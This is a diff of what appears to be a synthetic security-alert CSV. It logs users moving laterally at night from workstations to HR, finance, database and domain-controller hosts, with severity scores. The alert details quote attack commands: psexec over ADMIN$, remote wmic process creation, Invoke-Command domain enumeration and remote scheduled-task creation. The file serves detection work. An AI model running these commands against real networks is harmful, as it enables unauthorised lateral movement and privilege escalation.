@@ -1,182 +1,430 @@
 timestamp,user,host,alert_type,details,severity
-2025-11-22 02:11:10,ali,host001,Login outside working hours,User logged in at 02:11:10 (outside 06:00-18:00),0.55
-2025-11-22 02:11:10,ali,host001,Failed login burst before success,4 failed logins followed by successful logon,0.85
-2025-11-22 02:12:00,ali,hr01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'hr01',0.85
-2025-11-22 02:12:00,ali,hr01,Login outside working hours,User logged in at 02:12:00 (outside 06:00-18:00),0.55
-2025-11-22 02:12:10,ali,hr01,Admin share access,Suspicious share/SMB activity: \\hr01\C$,0.8
-2025-11-22 02:12:10,ali,hr01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'hr01',0.85
-2025-11-22 02:12:20,ali,hr01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'hr01',0.85
-2025-11-22 02:12:20,ali,hr01,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.7
-2025-11-22 02:12:20,ali,hr01,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.8
-2025-11-22 02:12:30,ali,hr01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'hr01',0.85
-2025-11-22 02:14:00,ali,hr02,Login outside working hours,User logged in at 02:14:00 (outside 06:00-18:00),0.55
-2025-11-22 02:14:00,ali,hr02,Multiple hosts in short time,User accessed hr02 after ['hr01'] within 10 min,0.75
-2025-11-22 02:14:00,ali,hr02,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'hr02',0.85
-2025-11-22 02:14:10,ali,hr02,Admin share access,Suspicious share/SMB activity: \\hr02\C$,0.8
-2025-11-22 02:14:10,ali,hr02,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'hr02',0.85
-2025-11-22 02:14:20,ali,hr02,Remote process creation,User ran wmic.exe: wmic /node:hr02 process call create powershell.exe,0.7
-2025-11-22 02:14:20,ali,hr02,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'hr02',0.85
-2025-11-22 02:16:00,ali,dc01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'dc01',0.85
-2025-11-22 02:16:00,ali,dc01,Multiple hosts in short time,"User accessed dc01 after ['hr01', 'hr02'] within 10 min",0.75
-2025-11-22 02:16:00,ali,dc01,Login outside working hours,User logged in at 02:16:00 (outside 06:00-18:00),0.55
-2025-11-22 02:16:10,ali,dc01,Admin share access,Suspicious share/SMB activity: \\dc01\C$,0.8
-2025-11-22 02:16:10,ali,dc01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'dc01',0.85
-2025-11-22 02:16:20,ali,dc01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'dc01',0.85
-2025-11-22 02:16:20,ali,dc01,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.8
-2025-11-22 02:16:20,ali,dc01,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.7
-2025-11-23 14:11:10,sara,host002,Failed login burst before success,4 failed logins followed by successful logon,0.85
-2025-11-23 14:12:00,sara,finance01,Sensitive host access,Unauthorized user 'sara' accessed sensitive host 'finance01',0.85
-2025-11-23 14:12:10,sara,finance01,Admin share access,Suspicious share/SMB activity: \\finance01\C$,0.8
-2025-11-23 14:12:10,sara,finance01,Sensitive host access,Unauthorized user 'sara' accessed sensitive host 'finance01',0.85
-2025-11-23 14:12:20,sara,finance01,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.7
-2025-11-23 14:12:20,sara,finance01,Sensitive host access,Unauthorized user 'sara' accessed sensitive host 'finance01',0.85
-2025-11-23 14:12:20,sara,finance01,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.8
-2025-11-23 14:12:30,sara,finance01,Sensitive host access,Unauthorized user 'sara' accessed sensitive host 'finance01',0.85
-2025-11-23 14:14:00,sara,finance02,Sensitive host access,Unauthorized user 'sara' accessed sensitive host 'finance02',0.85
-2025-11-23 14:14:00,sara,finance02,Multiple hosts in short time,User accessed finance02 after ['finance01'] within 10 min,0.75
-2025-11-23 14:14:10,sara,finance02,Sensitive host access,Unauthorized user 'sara' accessed sensitive host 'finance02',0.85
-2025-11-23 14:14:10,sara,finance02,Admin share access,Suspicious share/SMB activity: \\finance02\C$,0.8
-2025-11-23 14:14:20,sara,finance02,Sensitive host access,Unauthorized user 'sara' accessed sensitive host 'finance02',0.85
-2025-11-23 14:14:20,sara,finance02,Remote process creation,User ran wmic.exe: wmic /node:finance02 process call create powershell.exe,0.7
-2025-11-23 14:16:00,sara,db01,Sensitive host access,Unauthorized user 'sara' accessed sensitive host 'db01',0.85
-2025-11-23 14:16:00,sara,db01,Multiple hosts in short time,"User accessed db01 after ['finance01', 'finance02'] within 10 min",0.75
-2025-11-23 14:16:10,sara,db01,Admin share access,Suspicious share/SMB activity: \\db01\C$,0.8
-2025-11-23 14:16:10,sara,db01,Sensitive host access,Unauthorized user 'sara' accessed sensitive host 'db01',0.85
-2025-11-23 14:16:20,sara,db01,Sensitive host access,Unauthorized user 'sara' accessed sensitive host 'db01',0.85
-2025-11-23 14:16:20,sara,db01,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.8
-2025-11-23 14:16:20,sara,db01,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.7
-2025-11-24 22:11:10,omar,host003,Login outside working hours,User logged in at 22:11:10 (outside 06:00-18:00),0.55
-2025-11-24 22:11:10,omar,host003,Failed login burst before success,4 failed logins followed by successful logon,0.85
-2025-11-24 22:12:00,omar,finance01,Sensitive host access,Unauthorized user 'omar' accessed sensitive host 'finance01',0.85
-2025-11-24 22:12:00,omar,finance01,Login outside working hours,User logged in at 22:12:00 (outside 06:00-18:00),0.55
-2025-11-24 22:12:10,omar,finance01,Sensitive host access,Unauthorized user 'omar' accessed sensitive host 'finance01',0.85
-2025-11-24 22:12:10,omar,finance01,Admin share access,Suspicious share/SMB activity: \\finance01\C$,0.8
-2025-11-24 22:12:20,omar,finance01,Sensitive host access,Unauthorized user 'omar' accessed sensitive host 'finance01',0.85
-2025-11-24 22:12:20,omar,finance01,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.7
-2025-11-24 22:12:20,omar,finance01,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.8
-2025-11-24 22:12:30,omar,finance01,Sensitive host access,Unauthorized user 'omar' accessed sensitive host 'finance01',0.85
-2025-11-24 22:14:00,omar,db01,Sensitive host access,Unauthorized user 'omar' accessed sensitive host 'db01',0.85
-2025-11-24 22:14:00,omar,db01,Login outside working hours,User logged in at 22:14:00 (outside 06:00-18:00),0.55
-2025-11-24 22:14:00,omar,db01,Multiple hosts in short time,User accessed db01 after ['finance01'] within 10 min,0.75
-2025-11-24 22:14:10,omar,db01,Sensitive host access,Unauthorized user 'omar' accessed sensitive host 'db01',0.85
-2025-11-24 22:14:10,omar,db01,Admin share access,Suspicious share/SMB activity: \\db01\C$,0.8
-2025-11-24 22:14:20,omar,db01,Sensitive host access,Unauthorized user 'omar' accessed sensitive host 'db01',0.85
-2025-11-24 22:14:20,omar,db01,Remote process creation,User ran wmic.exe: wmic /node:db01 process call create powershell.exe,0.7
-2025-11-25 11:11:10,bilal,host005,Failed login burst before success,4 failed logins followed by successful logon,0.85
-2025-11-25 11:12:00,bilal,hr01,Sensitive host access,Unauthorized user 'bilal' accessed sensitive host 'hr01',0.85
-2025-11-25 11:12:10,bilal,hr01,Sensitive host access,Unauthorized user 'bilal' accessed sensitive host 'hr01',0.85
-2025-11-25 11:12:10,bilal,hr01,Admin share access,Suspicious share/SMB activity: \\hr01\C$,0.8
-2025-11-25 11:12:20,bilal,hr01,Sensitive host access,Unauthorized user 'bilal' accessed sensitive host 'hr01',0.85
-2025-11-25 11:12:20,bilal,hr01,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.8
-2025-11-25 11:12:20,bilal,hr01,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.7
-2025-11-25 11:12:30,bilal,hr01,Sensitive host access,Unauthorized user 'bilal' accessed sensitive host 'hr01',0.85
-2025-11-25 11:14:00,bilal,dc01,Sensitive host access,Unauthorized user 'bilal' accessed sensitive host 'dc01',0.85
-2025-11-25 11:14:00,bilal,dc01,Multiple hosts in short time,User accessed dc01 after ['hr01'] within 10 min,0.75
-2025-11-25 11:14:10,bilal,dc01,Admin share access,Suspicious share/SMB activity: \\dc01\C$,0.8
-2025-11-25 11:14:10,bilal,dc01,Sensitive host access,Unauthorized user 'bilal' accessed sensitive host 'dc01',0.85
-2025-11-25 11:14:20,bilal,dc01,Sensitive host access,Unauthorized user 'bilal' accessed sensitive host 'dc01',0.85
-2025-11-25 11:14:20,bilal,dc01,Remote process creation,User ran wmic.exe: wmic /node:dc01 process call create powershell.exe,0.7
-2025-11-25 11:20:57,bilal,host005,Multiple hosts in short time,"User accessed host005 after ['dc01', 'hr01'] within 10 min",0.75
-2025-11-26 03:11:10,nadia,host004,Failed login burst before success,4 failed logins followed by successful logon,0.85
-2025-11-26 03:11:10,nadia,host004,Login outside working hours,User logged in at 03:11:10 (outside 06:00-18:00),0.55
-2025-11-26 03:16:00,nadia,db01,Login outside working hours,User logged in at 03:16:00 (outside 06:00-18:00),0.55
-2025-11-26 03:16:00,nadia,db01,Sensitive host access,Unauthorized user 'nadia' accessed sensitive host 'db01',0.85
-2025-11-26 03:16:10,nadia,db01,Admin share access,Suspicious share/SMB activity: \\db01\C$,0.8
-2025-11-26 03:16:10,nadia,db01,Sensitive host access,Unauthorized user 'nadia' accessed sensitive host 'db01',0.85
-2025-11-26 03:16:20,nadia,db01,Sensitive host access,Unauthorized user 'nadia' accessed sensitive host 'db01',0.85
-2025-11-26 03:16:20,nadia,db01,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.7
-2025-11-26 03:16:20,nadia,db01,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.8
-2025-11-27 19:11:10,zoya,host006,Failed login burst before success,4 failed logins followed by successful logon,0.85
-2025-11-27 19:11:10,zoya,host006,Login outside working hours,User logged in at 19:11:10 (outside 06:00-18:00),0.55
-2025-11-27 19:12:00,zoya,finance01,Login outside working hours,User logged in at 19:12:00 (outside 06:00-18:00),0.55
-2025-11-27 19:12:00,zoya,finance01,Sensitive host access,Unauthorized user 'zoya' accessed sensitive host 'finance01',0.85
-2025-11-27 19:12:10,zoya,finance01,Admin share access,Suspicious share/SMB activity: \\finance01\C$,0.8
-2025-11-27 19:12:10,zoya,finance01,Sensitive host access,Unauthorized user 'zoya' accessed sensitive host 'finance01',0.85
-2025-11-27 19:12:20,zoya,finance01,Sensitive host access,Unauthorized user 'zoya' accessed sensitive host 'finance01',0.85
-2025-11-27 19:12:20,zoya,finance01,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.8
-2025-11-27 19:12:20,zoya,finance01,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.7
-2025-11-27 19:12:30,zoya,finance01,Sensitive host access,Unauthorized user 'zoya' accessed sensitive host 'finance01',0.85
-2025-11-27 19:14:00,zoya,hr02,Sensitive host access,Unauthorized user 'zoya' accessed sensitive host 'hr02',0.85
-2025-11-27 19:14:00,zoya,hr02,Login outside working hours,User logged in at 19:14:00 (outside 06:00-18:00),0.55
-2025-11-27 19:14:00,zoya,hr02,Multiple hosts in short time,User accessed hr02 after ['finance01'] within 10 min,0.75
-2025-11-27 19:14:10,zoya,hr02,Sensitive host access,Unauthorized user 'zoya' accessed sensitive host 'hr02',0.85
-2025-11-27 19:14:10,zoya,hr02,Admin share access,Suspicious share/SMB activity: \\hr02\C$,0.8
-2025-11-27 19:14:20,zoya,hr02,Remote process creation,User ran wmic.exe: wmic /node:hr02 process call create powershell.exe,0.7
-2025-11-27 19:14:20,zoya,hr02,Sensitive host access,Unauthorized user 'zoya' accessed sensitive host 'hr02',0.85
-2025-11-27 19:16:00,zoya,dc01,Sensitive host access,Unauthorized user 'zoya' accessed sensitive host 'dc01',0.85
-2025-11-27 19:16:00,zoya,dc01,Login outside working hours,User logged in at 19:16:00 (outside 06:00-18:00),0.55
-2025-11-27 19:16:00,zoya,dc01,Multiple hosts in short time,"User accessed dc01 after ['finance01', 'hr02'] within 10 min",0.75
-2025-11-27 19:16:10,zoya,dc01,Admin share access,Suspicious share/SMB activity: \\dc01\C$,0.8
-2025-11-27 19:16:10,zoya,dc01,Sensitive host access,Unauthorized user 'zoya' accessed sensitive host 'dc01',0.85
-2025-11-27 19:16:20,zoya,dc01,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.8
-2025-11-27 19:16:20,zoya,dc01,Sensitive host access,Unauthorized user 'zoya' accessed sensitive host 'dc01',0.85
-2025-11-27 19:16:20,zoya,dc01,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.7
-2025-11-28 01:11:10,emp012,ws-012,Failed login burst before success,4 failed logins followed by successful logon,0.85
-2025-11-28 01:11:10,emp012,ws-012,Login outside working hours,User logged in at 01:11:10 (outside 06:00-18:00),0.55
-2025-11-28 01:12:00,emp012,hr01,Sensitive host access,Unauthorized user 'emp012' accessed sensitive host 'hr01',0.85
-2025-11-28 01:12:00,emp012,hr01,Login outside working hours,User logged in at 01:12:00 (outside 06:00-18:00),0.55
-2025-11-28 01:12:10,emp012,hr01,Admin share access,Suspicious share/SMB activity: \\hr01\C$,0.8
-2025-11-28 01:12:10,emp012,hr01,Sensitive host access,Unauthorized user 'emp012' accessed sensitive host 'hr01',0.85
-2025-11-28 01:12:20,emp012,hr01,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.8
-2025-11-28 01:12:20,emp012,hr01,Sensitive host access,Unauthorized user 'emp012' accessed sensitive host 'hr01',0.85
-2025-11-28 01:12:20,emp012,hr01,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.7
-2025-11-28 01:12:30,emp012,hr01,Sensitive host access,Unauthorized user 'emp012' accessed sensitive host 'hr01',0.85
-2025-11-28 01:14:00,emp012,finance01,Multiple hosts in short time,User accessed finance01 after ['hr01'] within 10 min,0.75
-2025-11-28 01:14:00,emp012,finance01,Sensitive host access,Unauthorized user 'emp012' accessed sensitive host 'finance01',0.85
-2025-11-28 01:14:00,emp012,finance01,Login outside working hours,User logged in at 01:14:00 (outside 06:00-18:00),0.55
-2025-11-28 01:14:10,emp012,finance01,Sensitive host access,Unauthorized user 'emp012' accessed sensitive host 'finance01',0.85
-2025-11-28 01:14:10,emp012,finance01,Admin share access,Suspicious share/SMB activity: \\finance01\C$,0.8
-2025-11-28 01:14:20,emp012,finance01,Sensitive host access,Unauthorized user 'emp012' accessed sensitive host 'finance01',0.85
-2025-11-28 01:14:20,emp012,finance01,Remote process creation,User ran wmic.exe: wmic /node:finance01 process call create powershell.exe,0.7
-2025-11-28 01:16:00,emp012,db01,Multiple hosts in short time,"User accessed db01 after ['finance01', 'hr01'] within 10 min",0.75
-2025-11-28 01:16:00,emp012,db01,Login outside working hours,User logged in at 01:16:00 (outside 06:00-18:00),0.55
-2025-11-28 01:16:00,emp012,db01,Sensitive host access,Unauthorized user 'emp012' accessed sensitive host 'db01',0.85
-2025-11-28 01:16:10,emp012,db01,Admin share access,Suspicious share/SMB activity: \\db01\C$,0.8
-2025-11-28 01:16:10,emp012,db01,Sensitive host access,Unauthorized user 'emp012' accessed sensitive host 'db01',0.85
-2025-11-28 01:16:20,emp012,db01,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.8
-2025-11-28 01:16:20,emp012,db01,Sensitive host access,Unauthorized user 'emp012' accessed sensitive host 'db01',0.85
-2025-11-28 01:16:20,emp012,db01,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.7
-2025-11-29 04:11:10,emp077,ws-077,Login outside working hours,User logged in at 04:11:10 (outside 06:00-18:00),0.55
-2025-11-29 04:11:10,emp077,ws-077,Failed login burst before success,4 failed logins followed by successful logon,0.85
-2025-11-29 23:11:10,emp045,ws-045,Login outside working hours,User logged in at 23:11:10 (outside 06:00-18:00),0.55
-2025-11-29 23:11:10,emp045,ws-045,Failed login burst before success,4 failed logins followed by successful logon,0.85
-2025-11-29 23:12:00,emp045,finance02,Login outside working hours,User logged in at 23:12:00 (outside 06:00-18:00),0.55
-2025-11-29 23:12:00,emp045,finance02,Sensitive host access,Unauthorized user 'emp045' accessed sensitive host 'finance02',0.85
-2025-11-29 23:12:10,emp045,finance02,Admin share access,Suspicious share/SMB activity: \\finance02\C$,0.8
-2025-11-29 23:12:10,emp045,finance02,Sensitive host access,Unauthorized user 'emp045' accessed sensitive host 'finance02',0.85
-2025-11-29 23:12:20,emp045,finance02,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\finance02\ADMIN$ && psexec \\finance02 -s cmd.exe,0.7
-2025-11-29 23:12:20,emp045,finance02,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\finance02\ADMIN$ && psexec \\finance02 -s cmd.exe,0.8
-2025-11-29 23:12:20,emp045,finance02,Sensitive host access,Unauthorized user 'emp045' accessed sensitive host 'finance02',0.85
-2025-11-29 23:12:30,emp045,finance02,Sensitive host access,Unauthorized user 'emp045' accessed sensitive host 'finance02',0.85
-2025-11-29 23:14:00,emp045,dc01,Multiple hosts in short time,User accessed dc01 after ['finance02'] within 10 min,0.75
-2025-11-29 23:14:00,emp045,dc01,Login outside working hours,User logged in at 23:14:00 (outside 06:00-18:00),0.55
-2025-11-29 23:14:00,emp045,dc01,Sensitive host access,Unauthorized user 'emp045' accessed sensitive host 'dc01',0.85
-2025-11-29 23:14:10,emp045,dc01,Sensitive host access,Unauthorized user 'emp045' accessed sensitive host 'dc01',0.85
-2025-11-29 23:14:10,emp045,dc01,Admin share access,Suspicious share/SMB activity: \\dc01\C$,0.8
-2025-11-29 23:14:20,emp045,dc01,Sensitive host access,Unauthorized user 'emp045' accessed sensitive host 'dc01',0.85
-2025-11-29 23:14:20,emp045,dc01,Remote process creation,User ran wmic.exe: wmic /node:dc01 process call create powershell.exe,0.7
-2025-11-30 21:11:10,ali,host001,Login outside working hours,User logged in at 21:11:10 (outside 06:00-18:00),0.55
-2025-11-30 21:11:10,ali,host001,Failed login burst before success,4 failed logins followed by successful logon,0.85
-2025-11-30 21:12:00,ali,hr01,Login outside working hours,User logged in at 21:12:00 (outside 06:00-18:00),0.55
-2025-11-30 21:12:00,ali,hr01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'hr01',0.85
-2025-11-30 21:12:10,ali,hr01,Admin share access,Suspicious share/SMB activity: \\hr01\C$,0.8
-2025-11-30 21:12:10,ali,hr01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'hr01',0.85
-2025-11-30 21:12:20,ali,hr01,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.8
-2025-11-30 21:12:20,ali,hr01,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.7
-2025-11-30 21:12:20,ali,hr01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'hr01',0.85
-2025-11-30 21:12:30,ali,hr01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'hr01',0.85
-2025-11-30 21:14:00,ali,db01,Multiple hosts in short time,User accessed db01 after ['hr01'] within 10 min,0.75
-2025-11-30 21:14:00,ali,db01,Login outside working hours,User logged in at 21:14:00 (outside 06:00-18:00),0.55
-2025-11-30 21:14:00,ali,db01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'db01',0.85
-2025-11-30 21:14:10,ali,db01,Admin share access,Suspicious share/SMB activity: \\db01\C$,0.8
-2025-11-30 21:14:10,ali,db01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'db01',0.85
-2025-11-30 21:14:20,ali,db01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'db01',0.85
-2025-11-30 21:14:20,ali,db01,Remote process creation,User ran wmic.exe: wmic /node:db01 process call create powershell.exe,0.7
-2025-11-30 21:16:00,ali,dc01,Login outside working hours,User logged in at 21:16:00 (outside 06:00-18:00),0.55
-2025-11-30 21:16:00,ali,dc01,Multiple hosts in short time,"User accessed dc01 after ['db01', 'hr01'] within 10 min",0.75
-2025-11-30 21:16:00,ali,dc01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'dc01',0.85
-2025-11-30 21:16:10,ali,dc01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'dc01',0.85
-2025-11-30 21:16:10,ali,dc01,Admin share access,Suspicious share/SMB activity: \\dc01\C$,0.8
-2025-11-30 21:16:20,ali,dc01,Remote process creation,User ran psexec.exe: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.7
-2025-11-30 21:16:20,ali,dc01,Admin share access,Suspicious share/SMB activity: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.8
-2025-11-30 21:16:20,ali,dc01,Sensitive host access,Unauthorized user 'ali' accessed sensitive host 'dc01',0.85
+2025-11-12 02:10:00,ali,host001,Failed login burst before success,Event 4625 [- | src=192.168.50.77] Failed logon attempt #1/4 on host001,0.85
+2025-11-12 02:10:15,ali,host001,Failed login burst before success,Event 4625 [- | src=192.168.50.77] Failed logon attempt #2/4 on host001,0.85
+2025-11-12 02:10:30,ali,host001,Failed login burst before success,Event 4625 [- | src=192.168.50.77] Failed logon attempt #3/4 on host001,0.85
+2025-11-12 02:10:45,ali,host001,Failed login burst before success,Event 4625 [- | src=192.168.50.77] Failed logon attempt #4/4 on host001,0.85
+2025-11-12 02:11:10,ali,host001,Login outside working hours,Event 4624 [explorer.exe | src=192.168.50.77] logon on host001 at 02:11:10 (outside 06:00-18:00),0.55
+2025-11-12 02:11:18,ali,host001,Login outside working hours,Event 4624 [mstsc.exe | src=192.168.50.77] logon on host001 at 02:11:18 (outside 06:00-18:00),0.55
+2025-11-12 02:11:30,ali,host001,Admin share access,Event 4688 [powershell.exe | src=192.168.50.77] cmd: Invoke-Command -ComputerName hr01 -ScriptBlock {whoami; net user /domain},0.8
+2025-11-12 02:11:30,ali,host001,Remote process creation,Event 4688 [powershell.exe | src=192.168.50.77] on host001: Invoke-Command -ComputerName hr01 -ScriptBlock {whoami; net user /domain},0.7
+2025-11-12 02:12:00,ali,hr01,Login outside working hours,Event 4624 [- | src=10.0.0.5] logon on hr01 at 02:12:00 (outside 06:00-18:00),0.55
+2025-11-12 02:12:00,ali,hr01,Sensitive host access,Event 4624 [- | src=10.0.0.5] on hr01 (unauthorized host access),0.85
+2025-11-12 02:12:00,ali,hr01,Multiple hosts in short time,Event 4624 [- | src=10.0.0.5] hopped to hr01 (after ['host001']),0.75
+2025-11-12 02:12:10,ali,hr01,Sensitive host access,Event 5140 [- | src=10.0.0.5] on hr01 cmd: \\hr01\C$,0.85
+2025-11-12 02:12:10,ali,hr01,Admin share access,Event 5140 [- | src=10.0.0.5] cmd: \\hr01\C$,0.8
+2025-11-12 02:12:12,ali,hr01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.5] on hr01 cmd: rdp_session_50,0.85
+2025-11-12 02:12:12,ali,hr01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.0.5] logon on hr01 at 02:12:12 (outside 06:00-18:00),0.55
+2025-11-12 02:12:20,ali,hr01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.5] on hr01: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.7
+2025-11-12 02:12:20,ali,hr01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.5] on hr01 cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.85
+2025-11-12 02:12:20,ali,hr01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.5] cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.8
+2025-11-12 02:12:22,ali,hr01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.5] on hr01: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.7
+2025-11-12 02:12:22,ali,hr01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.5] cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.8
+2025-11-12 02:12:22,ali,hr01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.5] on hr01 cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.85
+2025-11-12 02:12:30,ali,hr01,Sensitive host access,Event 4698 [schtasks.exe | src=10.0.0.5] on hr01 cmd: schtasks /create /s hr01 /tn SysUpdater /tr cmd.exe,0.85
+2025-11-12 02:12:35,ali,hr01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.5] on hr01: C:\Windows\PSEXESVC.exe,0.7
+2025-11-12 02:12:35,ali,hr01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.5] on hr01 cmd: C:\Windows\PSEXESVC.exe,0.85
+2025-11-12 02:14:00,ali,hr02,Login outside working hours,Event 4624 [- | src=10.0.0.5] logon on hr02 at 02:14:00 (outside 06:00-18:00),0.55
+2025-11-12 02:14:00,ali,hr02,Multiple hosts in short time,"Event 4624 [- | src=10.0.0.5] hopped to hr02 (after ['host001', 'hr01'])",0.75
+2025-11-12 02:14:00,ali,hr02,Sensitive host access,Event 4624 [- | src=10.0.0.5] on hr02 (unauthorized host access),0.85
+2025-11-12 02:14:10,ali,hr02,Sensitive host access,Event 5140 [- | src=10.0.0.5] on hr02 cmd: \\hr02\C$,0.85
+2025-11-12 02:14:10,ali,hr02,Admin share access,Event 5140 [- | src=10.0.0.5] cmd: \\hr02\C$,0.8
+2025-11-12 02:14:12,ali,hr02,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.5] on hr02 cmd: rdp_session_51,0.85
+2025-11-12 02:14:12,ali,hr02,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.0.5] logon on hr02 at 02:14:12 (outside 06:00-18:00),0.55
+2025-11-12 02:14:20,ali,hr02,Remote process creation,Event 4688 [wmic.exe | src=10.0.0.5] on hr02: wmic /node:hr02 process call create powershell.exe,0.7
+2025-11-12 02:14:20,ali,hr02,Sensitive host access,Event 4688 [wmic.exe | src=10.0.0.5] on hr02 cmd: wmic /node:hr02 process call create powershell.exe,0.85
+2025-11-12 02:14:22,ali,hr02,Sensitive host access,Event 4688 [wmic.exe | src=10.0.0.5] on hr02 cmd: wmic /node:hr02 process call create powershell.exe,0.85
+2025-11-12 02:14:22,ali,hr02,Remote process creation,Event 4688 [wmic.exe | src=10.0.0.5] on hr02: wmic /node:hr02 process call create powershell.exe,0.7
+2025-11-12 02:16:00,ali,dc01,Multiple hosts in short time,"Event 4624 [- | src=10.0.0.5] hopped to dc01 (after ['host001', 'hr01', 'hr02'])",0.75
+2025-11-12 02:16:00,ali,dc01,Sensitive host access,Event 4624 [- | src=10.0.0.5] on dc01 (unauthorized host access),0.85
+2025-11-12 02:16:00,ali,dc01,Login outside working hours,Event 4624 [- | src=10.0.0.5] logon on dc01 at 02:16:00 (outside 06:00-18:00),0.55
+2025-11-12 02:16:10,ali,dc01,Admin share access,Event 5140 [- | src=10.0.0.5] cmd: \\dc01\C$,0.8
+2025-11-12 02:16:10,ali,dc01,Sensitive host access,Event 5140 [- | src=10.0.0.5] on dc01 cmd: \\dc01\C$,0.85
+2025-11-12 02:16:12,ali,dc01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.5] on dc01 cmd: rdp_session_52,0.85
+2025-11-12 02:16:12,ali,dc01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.0.5] logon on dc01 at 02:16:12 (outside 06:00-18:00),0.55
+2025-11-12 02:16:20,ali,dc01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.5] cmd: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.8
+2025-11-12 02:16:20,ali,dc01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.5] on dc01: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.7
+2025-11-12 02:16:20,ali,dc01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.5] on dc01 cmd: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.85
